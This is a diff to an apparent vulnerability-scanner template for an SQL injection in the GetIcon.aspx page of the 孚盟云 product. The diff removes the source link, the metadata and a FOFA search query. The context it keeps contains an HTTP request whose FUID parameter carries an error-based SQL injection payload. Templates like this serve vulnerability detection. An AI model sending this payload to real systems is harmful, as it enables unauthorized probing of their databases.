@@ -3,12 +3,8 @@ info:
   name: 孚盟云GetIcon存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lfq7a1b6crpsm5xx'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lfq7a1b6crpsm5xx
-    fofa: app="孚盟软件-孚盟云"
 http:
 - raw:
   - 'GET /Common/GetIcon.aspx?FUID=-1%27and+1=@@VERSION-- HTTP/1.1
